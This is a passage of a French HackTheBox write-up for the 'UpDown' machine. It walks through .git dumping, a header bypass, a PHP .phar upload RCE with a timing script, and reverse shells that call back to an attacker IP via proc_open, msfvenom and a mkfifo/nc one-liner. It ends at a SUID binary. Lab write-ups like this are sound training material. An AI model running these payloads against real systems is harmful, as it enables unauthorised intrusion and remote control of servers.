+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster vhost -u <span class=s2>&#34;siteisup.htb&#34;</span> -w <span class=sb>`</span>fzf-wordlists<span class=sb>`</span> --append-domain
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.6
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:             http://siteisup.htb
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:          GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:         <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:        /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:      gobuster/3.6
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:         10s
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Append Domain:   <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in VHOST enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Found: dev.siteisup.htb Status: <span class=m>403</span> <span class=o>[</span>Size: 281<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=devgit---git-dumper>dev/.git - git-dumper</h3><p>On trouve une dossier dev/.git :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dirsearch -u http://siteisup.htb/dev 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  _<span class=p>|</span>. _ _  _  _  _ _<span class=p>|</span>_    v0.4.3
+</span></span><span class=line><span class=cl> <span class=o>(</span>_<span class=o>||</span><span class=p>|</span> _<span class=o>)</span> <span class=o>(</span>/_<span class=o>(</span>_<span class=o>||</span> <span class=o>(</span>_<span class=p>|</span> <span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Extensions: php, asp, aspx, jsp, html, htm <span class=p>|</span> HTTP method: GET <span class=p>|</span> Threads: <span class=m>25</span> <span class=p>|</span> Wordlist size: <span class=m>12289</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Target: http://siteisup.htb/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:20<span class=o>]</span> Scanning: dev/
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:22<span class=o>]</span> <span class=m>301</span> -   315B - /dev/.git  -&gt;  http://siteisup.htb/dev/.git/
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:22<span class=o>]</span> <span class=m>200</span> -    3KB - /dev/.git/
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:22<span class=o>]</span> <span class=m>200</span> -   772B - /dev/.git/branches/
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:22<span class=o>]</span> <span class=m>200</span> -   298B - /dev/.git/config
+</span></span><span class=line><span class=cl><span class=o>[</span>00:47:22<span class=o>]</span> <span class=m>200</span> -    73B - /dev/.git/description
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p>Dans le .git, on trouve un fichier .htaccess nous indiquant qu&rsquo;un header spécifique permettrait de débloquer l&rsquo;accès à certaines pages.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ git-dumper http://siteisup.htb/dev/ ./git-dump
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> git-dump
+</span></span><span class=line><span class=cl>$ cat .htaccess
+</span></span><span class=line><span class=cl>SetEnvIfNoCase Special-Dev <span class=s2>&#34;only4dev&#34;</span> Required-Header
+</span></span><span class=line><span class=cl>Order Deny,Allow
+</span></span><span class=line><span class=cl>Deny from All
+</span></span><span class=line><span class=cl>Allow from <span class=nv>env</span><span class=o>=</span>Required-Header
+</span></span></code></pre></td></tr></table></div></div><p>En essayant d&rsquo;accéder à <strong>dev.siteisup.htb</strong> en ajoutant le header, on obtient l&rsquo;accès à ce vhost !</p><h3 id=checkerphp>checker.php</h3><p>On trouve un fichier changelog.txt indiquant qu&rsquo;une option nous permettant d&rsquo;upload des fichiers existe.
+<code>changelog.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat changelog.txt
+</span></span><span class=line><span class=cl>Beta version
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1- Check a bunch of websites.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-- ToDo:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1- Multithreading <span class=k>for</span> a faster version :D.
+</span></span><span class=line><span class=cl>2- Remove the upload option.
+</span></span><span class=line><span class=cl>3- New admin panel.
+</span></span></code></pre></td></tr></table></div></div><p>En analysant la page disponible sur dev.siteisup.htb et le fichier <strong>checker.php</strong> récupérer dans le .git, on comprend qu&rsquo;il s&rsquo;agit bien de la meme page.</p><p>Cette page semble contenir une vulnérabilité de type File Upload, nous permettant eventuellement d&rsquo;executer du code PHP.</p><h3 id=file-upload---php-rce>File Upload - PHP RCE</h3><p>La requete suivante permet d&rsquo;uploader un fichier PHP avec l&rsquo;extension <strong>.phar</strong>, qui sera executé correctement comme du php :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST / HTTP/1.1
+</span></span><span class=line><span class=cl>Host: dev.siteisup.htb
+</span></span><span class=line><span class=cl>Special-Dev: only4dev
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> Ubuntu<span class=p>;</span> Linux x86_64<span class=p>;</span> rv:144.0<span class=o>)</span> Gecko/20100101 Firefox/144.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,*/*<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8
+</span></span><span class=line><span class=cl>Accept-Language: fr,fr-FR<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8,en-US<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.5,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.3
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br
+</span></span><span class=line><span class=cl>Content-Type: multipart/form-data<span class=p>;</span> <span class=nv>boundary</span><span class=o>=</span>----geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>652</span>
+</span></span><span class=line><span class=cl>Origin: http://dev.siteisup.htb
+</span></span><span class=line><span class=cl>Connection: keep-alive
+</span></span><span class=line><span class=cl>Referer: http://dev.siteisup.htb
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: <span class=m>1</span>
+</span></span><span class=line><span class=cl>Priority: <span class=nv>u</span><span class=o>=</span>0, i
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
+</span></span><span class=line><span class=cl>Content-Disposition: form-data<span class=p>;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;file&#34;</span><span class=p>;</span> <span class=nv>filename</span><span class=o>=</span><span class=s2>&#34;shell.phar&#34;</span>
+</span></span><span class=line><span class=cl>Content-Type: application/x-php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>http://siteisup.com
+</span></span><span class=line><span class=cl>http://10.10.10.10
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>http://siteisup.com
+</span></span><span class=line><span class=cl>http://10.10.10.10
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>http://siteisup.com
+</span></span><span class=line><span class=cl>http://10.10.10.10
+</span></span><span class=line><span class=cl>http://google.com
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl><span class=nb>echo</span> file_get_contents<span class=o>(</span> <span class=s2>&#34;/etc/passwd&#34;</span> <span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>?&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8
+</span></span><span class=line><span class=cl>Content-Disposition: form-data<span class=p>;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;check&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Check
+</span></span><span class=line><span class=cl>------geckoformboundary5c49bfd8a8fdd6fcf6070b52067a09e8--
+</span></span></code></pre></td></tr></table></div></div><p>Le code source de <strong>checker.php</strong> récupérer dans le <strong>.git</strong>, nous montre que les fichiers sont uploader dans un dossier du nom de:</p><blockquote><p>md5(time())</p></blockquote><p>On a donc créer le code bash suivant, afin de retrouver rapidement le fichier shell.phar :
+<code>md5.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>timestamp</span><span class=o>=</span><span class=k>$(</span>date +%s<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> i in <span class=o>{</span>1..10<span class=o>}</span><span class=p>;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=nv>t</span><span class=o>=</span><span class=k>$((</span><span class=nv>$timestamp</span><span class=o>-</span><span class=nv>$i</span><span class=k>))</span>
+</span></span><span class=line><span class=cl>    <span class=nv>md5</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> -n <span class=nv>$t</span> <span class=p>|</span> md5sum <span class=p>|</span> cut -d<span class=s1>&#39; &#39;</span> -f1<span class=k>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#echo $md5</span>
+</span></span><span class=line><span class=cl>    <span class=nv>url</span><span class=o>=</span><span class=s1>&#39;http://dev.siteisup.htb/uploads/&#39;</span><span class=nv>$md5</span><span class=s1>&#39;/&#39;</span><span class=nv>$1</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;curl &#34;</span><span class=nv>$url</span><span class=s2>&#34; -H &#39;Special-Dev: only4dev&#39; -i&#34;</span>
+</span></span><span class=line><span class=cl>    curl <span class=nv>$url</span> -H <span class=s1>&#39;Special-Dev: only4dev&#39;</span> -i
+</span></span><span class=line><span class=cl><span class=k>done</span>
+</span></span></code></pre></td></tr></table></div></div><p>Ce code <strong>Bash</strong> génère 10 noms de dossiers possible pour les 10 dernières secondes écoulées, puis effectuer des requêtes curl avec ces 10 dossiers vers le fichier shell.phar.</p><p>Lors de l&rsquo;execution de notre requpête Burp, il suffit ensuite d&rsquo;executer notre script Bash qui va retrouver notre fichier shell.phar et executer le code PHP présent. ATTENTION, dans la requete Burp, il faut rajouter beaucoup de :</p><blockquote><p><a class=link href=http://google.com target=_blank rel=noopener>http://google.com</a>
+<a class=link href=http://google.com target=_blank rel=noopener>http://google.com</a>
+&mldr;</p></blockquote><p>au début de la requête.</p><p>En effet, le fichier <strong>shell.phar</strong> est créer uniquement le temps de vérification des URL par le checker.php. Plus on met d&rsquo;URL, plus le temps d&rsquo;execution est long et notre fichier n&rsquo;est pas supprimé.</p><p>Dans un premier temps, on a afficher <strong>/etc/passwd</strong> :</p><blockquote><p>./md5.sh shell.phar</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:111:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class=line><span class=cl>developer:x:1002:1002::/home/developer:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><h3 id=reverse-shell---proc_open>Reverse Shell - proc_open</h3><p>En regardant la sortie de phpinfo(), on découvre qu&rsquo;une liste de fonctions est bloqué:</p><ul><li>system, shell_exec, exec&mldr;</li></ul><p>Les fonctions utilisées habituellement pour executer des commandes et obtenir un reverse shell ne fonctionnent pas.</p><p>Cependant, après quelques recherches on trouve le fonction <strong>proc_open</strong> qui n&rsquo;est pas bloqué et permet d&rsquo;executer du code :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl><span class=nv>$descriptorspec</span> <span class=o>=</span> array<span class=o>(</span>
+</span></span><span class=line><span class=cl>   <span class=nv>0</span> <span class=o>=</span>&gt; array<span class=o>(</span><span class=s2>&#34;pipe&#34;</span>, <span class=s2>&#34;r&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>   <span class=nv>1</span> <span class=o>=</span>&gt; array<span class=o>(</span><span class=s2>&#34;pipe&#34;</span>, <span class=s2>&#34;w&#34;</span><span class=o>)</span>,
+</span></span><span class=line><span class=cl>   <span class=nv>2</span> <span class=o>=</span>&gt; array<span class=o>(</span><span class=s2>&#34;pipe&#34;</span>, <span class=s2>&#34;w&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1&#39;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$process</span> <span class=o>=</span> proc_open<span class=o>(</span><span class=nv>$cmd</span>, <span class=nv>$descriptorspec</span>, <span class=nv>$pipes</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>is_resource<span class=o>(</span><span class=nv>$process</span><span class=o>))</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    fclose<span class=o>(</span><span class=nv>$pipes</span><span class=o>[</span>0<span class=o>])</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> stream_get_contents<span class=o>(</span><span class=nv>$pipes</span><span class=o>[</span>1<span class=o>])</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    fclose<span class=o>(</span><span class=nv>$pipes</span><span class=o>[</span>1<span class=o>])</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> stream_get_contents<span class=o>(</span><span class=nv>$pipes</span><span class=o>[</span>2<span class=o>])</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    fclose<span class=o>(</span><span class=nv>$pipes</span><span class=o>[</span>2<span class=o>])</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    proc_close<span class=o>(</span><span class=nv>$process</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>La meilleure technique aurait été de directement généré un reverse shell php à l&rsquo;aide de <strong>msfvenom</strong>. Ce code php teste 1 par 1 toutes les fonctions permettant l&rsquo;execution de commandes systèmes :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p php/reverse_php <span class=nv>LHOST</span><span class=o>=</span>10.10.14.14 <span class=nv>LPORT</span><span class=o>=</span><span class=m>1337</span> -f raw &gt; shell.php
+</span></span></code></pre></td></tr></table></div></div><p>En utilisant ce code, on obient directement un reverse shell à l&rsquo;aide de <strong>proc_open</strong>. Le problème avec cette méthode est qu&rsquo;on ne sait pas forcement quelle fonction à permis d&rsquo;obtenir le reverse shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -lnvp <span class=m>1337</span>
+</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
+</span></span><span class=line><span class=cl>Ncat: Listening on :::1337
+</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:1337
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177.
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177:49708.
+</span></span><span class=line><span class=cl>socket_create
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>www-data
+</span></span><span class=line><span class=cl>rm /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>bash -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc 10.10.14.14 <span class=m>1338</span> &gt;/tmp/f
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-------------------
+</span></span><span class=line><span class=cl><span class=c1># Better shell</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ nc -lnvp <span class=m>1338</span>
+</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
+</span></span><span class=line><span class=cl>Ncat: Listening on :::1338
+</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:1338
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177.
+</span></span><span class=line><span class=cl>Ncat: Connection from 10.10.11.177:35496.
+</span></span><span class=line><span class=cl>sh: 0: can<span class=s1>&#39;t access tty; job control turned off
+</span></span></span><span class=line><span class=cl><span class=s1>$ whoami
+</span></span></span><span class=line><span class=cl><span class=s1>www-data
+</span></span></span><span class=line><span class=cl><span class=s1>$ python -c &#39;</span>import pty<span class=p>;</span>pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=err>&#39;</span>
+</span></span><span class=line><span class=cl>www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span><span class=line><span class=cl>&lt;ab47bcda3749f056619b17b959cdd659$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm                   
+</span></span><span class=line><span class=cl>www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$ ^Z
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>13292</span> suspended  nc -lnvp <span class=m>1338</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>exegol-pentest<span class=o>]</span> downloads <span class=c1># stty raw -echo;fg</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>13292</span> continued  nc -lnvp <span class=m>1338</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>www-data@updown:/var/www/dev/uploads/ab47bcda3749f056619b17b959cdd659$
+</span></span></code></pre></td></tr></table></div></div><h2 id=www-data---developer>www-data -> developer</h2><h3 id=suid-binary---python-injection>SUID binary - Python Injection</h3><p>On trouve un binaire <strong>siteiup</strong>. En l&rsquo;executant, on se rend compte qu&rsquo;il interprete directement le code de &ldquo;siteisup_test.py&rdquo;.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@updown:/home/developer$ ls
+</span></span><span class=line><span class=cl>dev  user.txt
+</span></span><span class=line><span class=cl>www-data@updown:/home/developer$ <span class=nb>cd</span> dev
+</span></span><span class=line><span class=cl>www-data@updown:/home/developer/dev$ ls -lah
+</span></span><span class=line><span class=cl>total 32K
+</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>2</span> developer www-data  4.0K Jun <span class=m>22</span>  <span class=m>2022</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> developer developer 4.0K Aug <span class=m>30</span>  <span class=m>2022</span> ..
+</span></span><span class=line><span class=cl>-rwsr-x--- <span class=m>1</span> developer www-data   17K Jun <span class=m>22</span>  <span class=m>2022</span> siteisup
